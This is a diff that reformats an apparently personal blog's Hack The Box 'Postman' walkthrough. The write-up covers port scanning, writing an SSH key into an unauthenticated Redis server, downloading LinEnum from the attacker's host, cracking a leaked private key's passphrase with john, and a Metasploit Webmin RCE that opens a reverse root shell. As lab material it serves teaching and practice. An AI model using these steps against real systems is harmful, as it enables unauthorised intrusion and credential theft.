@@ -1,9 +1,8 @@
 ---
-layout: post
-title:  "Hack The Box - Postman"
-date:   2020-03-15 11:33:00 +0800
-categories: hackthebox
-tags: redis ssh webmin linux
+title: Hack The Box - Postman
+date: 2020-03-15 11:33:00 +0800
+categories: [hackthebox]
+tags: [redis, ssh, webmin, linux]
 ---
 Despite the name of this box, it was nowhere related to [Postman](https://www.getpostman.com/)! This box was quite weird as I actually jumped straight to root instead of going to user first.
 
@@ -15,14 +14,14 @@ The operating systems that I will be using to tackle this machine is a Kali Linu
 
 What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.
 
-{% highlight bash %}
+```bash
 $ echo "10.10.10.160 postman.htb" >> /etc/hosts
-{% endhighlight %}
+```
 
 # Reconnaissance
 
 Using `nmap`, we are able to determine the open ports and running services on the machine.
-{% highlight bash %}
+```bash
 $ nmap -sV -sT -sC postman.htb
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-09 01:39 EST
 Nmap scan report for postman.htb (10.10.10.160)
@@ -42,7 +41,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 269.64 seconds
 
-{% endhighlight %}
+```
 
 # Enumeration
 
@@ -52,7 +51,7 @@ Not much can be done with the `ssh` service as we do not have any credentials on
 
 Seems like an online portfolio or blog. There isn't much to look at though so lets brute force the directories.
 
-{% highlight bash %}
+```bash
 $ gobuster dir -u http://postman.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -q
 /images (Status: 301)
 /upload (Status: 301)
@@ -60,7 +59,7 @@ $ gobuster dir -u http://postman.htb -w /usr/share/wordlists/dirbuster/directory
 /js (Status: 301)
 /fonts (Status: 301)
 /server-status (Status: 403)
-{% endhighlight %}
+```
 
 `/upload` seemed interesting but it was just a bunch of images.
 
@@ -68,7 +67,7 @@ $ gobuster dir -u http://postman.htb -w /usr/share/wordlists/dirbuster/directory
 
 Seems like a dead end. Lets try expanding our range of ports to scan.
 
-{% highlight bash %}
+```bash
 $ nmap -sS -p 1-65535 postman.htb
 Nmap scan report for postman.htb (10.10.10.160)
 Host is up (0.26s latency).
@@ -81,13 +80,13 @@ PORT      STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 4548.36 seconds
 
-{% endhighlight %}
+```
 
 Ooo 2 more ports appeared! Lets check out the `redis` service on port `6379`. I came across this article on how to get myself a remote shell to the box.
 
 The first step was to check if authentication is required. Using `nc`, I attempted to send a `echo` command and it was executed successfully.
 
-{% highlight bash %}
+```bash
 nc -v postman.htb 6379
 postman.htb [10.10.10.160] 6379 (?) open
 echo "Authentication required?"
@@ -95,11 +94,11 @@ $24
 Authentication required?
 quit
 +OK
-{% endhighlight %}
+```
 
 As you can see, the `redis` service echoed back our text. Remember that there was a `ssh` service running on the box? Lets generate a new `ssh` key and attempt to write it onto the machine.
 
-{% highlight bash %}
+```bash
 ssh-keygen -t rsa
 Generating public/private rsa key pair.
 Enter file in which to save the key (/root/.ssh/id_rsa): 
@@ -121,16 +120,16 @@ The key's randomart image is:
 |..oE.            |
 |o...             |
 +----[SHA256]-----+
-{% endhighlight %}
+```
 
 We then have to prepare the public key to be sent to the `redis` server.
-{% highlight bash %}
+```bash
 $ (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt
-{% endhighlight %}
+```
 
 Using `redis-cli`, we connect to the `redis` server and print the current working directory as well as the location of where the database will be saved to.
 
-{% highlight bash %}
+```bash
 redis-cli -h postman.htb
 postman.htb:6379> config get dir
 1) "dir"
@@ -138,22 +137,22 @@ postman.htb:6379> config get dir
 postman.htb:6379> config get dbfilename
 1) "dbfilename"
 2) "authorized_keys"
-{% endhighlight %}
+```
 
 Alright, we are in the correct directory already and the the database will be written to `authorized_keys` when we save. Next we need to clear the database, write our key into it and then save it.
 
-{% highlight bash %}
+```bash
 $ redis-cli -h postman.htb flushall
 OK
 $ cat foo.txt | redis-cli -h postman.htb -x set crackit
 OK
 $ redis-cli -h postman.htb save
 OK
-{% endhighlight %}
+```
 
 Now if try to `ssh` as the `redis` user using the `ssh` key we made,
 
-{% highlight bash %}
+```bash
 ssh -i ~/.ssh/id_rsa redis@postman.htb
 Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)
 
@@ -169,26 +168,26 @@ Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your 
 
 Last login: Tue Dec 31 09:16:39 2019 from 10.10.XX.XX
 redis@Postman:~$
-{% endhighlight %}
+```
 
 Success! Too bad `redis` wasn't the user that has the flag :P If we list `/home`, we see another user called `Matt`.
 
-{% highlight bash %}
+```bash
 redis@Postman:~$ ls /home
 Matt
-{% endhighlight %}
+```
 
 Lets see if running ['LinEnum'](https://github.com/rebootuser/LinEnum) will give us any insights on how to get access to `Matt`. I will be starting a web server on my machine using the builtin `SimpleHTTPServer` module in `python` and use `wget` to retrieve it.
 
-{% highlight bash %}
+```bash
 $ mkdir httpserver
 $ cd httpserver
 $ cp ~/LinEnum.sh .
 $ python -m SimpleHTTPServer 80
 Serving HTTP on 0.0.0.0 port 80 ...
-{% endhighlight %}
+```
 
-{% highlight bash %}
+```bash
 redis@Postman:~$ wget http://10.10.XX.XX/LinEnum.sh
 --2019-12-31 10:18:04--  http://10.10.XX.XX/LinEnum.sh
 Connecting to 10.10.XX.XX:80... connected.
@@ -200,11 +199,11 @@ LinEnum.sh                   100%[=============================================>
 
 2019-12-31 10:18:05 (59.1 KB/s) - ‘LinEnum.sh’ saved [46476/46476]
 
-{% endhighlight %}
+```
 
 Running `LinEnum.sh` shows that there is a `ssh` private key backup in `/opt` named `id_rsa.bak` owned by user `Matt`. Interesting...
 
-{% highlight bash %}
+```bash
 redis@Postman:~$ ./LinEnum.sh
 ...
 [-] Location and Permissions (if accessible) of .bak file(s):
@@ -247,17 +246,17 @@ npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
 VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
 X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
 -----END RSA PRIVATE KEY-----
-{% endhighlight %}
+```
 
 With this private `ssh` key, we could try to `ssh` as `Matt`.
-{% highlight bash %}
+```bash
 $ ssh -i id_rsa.bak Matt@postman.htb
 Enter passphrase for key 'id_rsa.bak':
-{% endhighlight %}
+```
 
 Seems like we need a passphrase. Lets see if we can crack it with `john`. 
 
-{% highlight bash %}
+```bash
 $ python ssh2john.py id_rsa.bak > matt.hash
 $ john --wordlist=/usr/share/wordlists/rockyou.txt matt.hash
 Using default input encoding: UTF-8
@@ -273,15 +272,15 @@ Warning: Only 2 candidates left, minimum 8 needed for performance.
 1g 0:00:00:04 DONE (2019-12-31 05:57) 0.2083g/s 2987Kp/s 2987Kc/s 2987KC/sa6_123..*7¡Vamos!
 Session completed
 
-{% endhighlight %}
+```
 
 With the passphrase, lets try to `ssh` as `Matt` again.
 
-{% highlight bash %}
+```bash
 $ ssh -i id_rsa.bak Matt@postman.htb
 Enter passphrase for key 'id_rsa.bak': 
 Connection closed by 10.10.10.160 port 22
-{% endhighlight %}
+```
 
 What is going on? We are immediately getting disconnected. After some trials, I kind of gave up and decided to move on to the next service at port `10000`.
 
@@ -297,7 +296,7 @@ Lets try to login using `Matt:computer2008` as our credentials.
 
 Ooo it seems like a dashboard that monitors the `Webmin` service. After looking around, there doesn't seem to be any place where we attack from. Lets see if we can find any exploits using `searchsploit`.
 
-{% highlight bash %}
+```bash
 $ searchsploit webmin
 -------------------------------------------------------------------------- ----------------------------------------
  Exploit Title                                                            |  Path
@@ -308,13 +307,13 @@ Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)    | expl
 ...
 -------------------------------------------------------------------------- ----------------------------------------
 Shellcodes: No Result
-{% endhighlight %}
+```
 
 # Exploitation
 
 Hmm from the `nmap` results and the dashboard, we can tell that the version of `Webmin` is `1.910`, hence we will use the exploit whose target version is nearest to it.
 
-{% highlight bash %}
+```bash
 $ msfconsole
 msf5 > use exploit/linux/http/webmin_packageup_rce
 msf5 exploit(linux/http/webmin_packageup_rce) > set LHOST 10.10.XX.XX
@@ -333,44 +332,44 @@ msf5 exploit(linux/http/webmin_packageup_rce) > run
 [*] Command shell session 2 opened (10.10.XX.XX:4444 -> 10.10.10.160:55156) at 2019-12-31 07:50:17 -0500
 
 
-{% endhighlight %}
+```
 
 There's no prompt but lets try to upgrade to a `tty` shell.
 
-{% highlight bash %}
+```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
 root@Postman:/usr/share/webmin/package-updates/# id
 id
 uid=0(root) gid=0(root) groups=0(root)
-{% endhighlight %}
+```
 
 Oh damn! We are already root! Getting both the user and root flags should be no problem now.
 
 # user.txt(1)
 
-{% highlight bash %}
+```bash
 root@Postman:/usr/share/webmin/package-updates/# cat /home/Matt/user.txt
 cat /home/Matt/user.txt
 517aXXXXXXXXXXXXXXXXXXXXXXXXXXXX
-{% endhighlight %}
+```
 
 # root.txt
 
-{% highlight bash %}
+```bash
 root@Postman:/usr/share/webmin/package-updates/# cat /root/root.txt
 cat /root/root.txt
 a257XXXXXXXXXXXXXXXXXXXXXXXXXXXX
-{% endhighlight %}
+```
 
 # user.txt(2)
 
 Turns out `ssh`ing as the user isn't the only way to remotely access it. Running `su` allowed us login at `Matt`.
 
-{% highlight bash %}
+```bash
 redis@Postman:~$ su Matt
 Password: 
 Matt@Postman:/var/lib/redis$ cat ~/user.txt
 517aXXXXXXXXXXXXXXXXXXXXXXXXXXXX
-{% endhighlight %}
+```
 
-## Rooted ! Thank you for reading and look forward for more writeups and articles !
+### Rooted ! Thank you for reading and look forward for more writeups and articles !
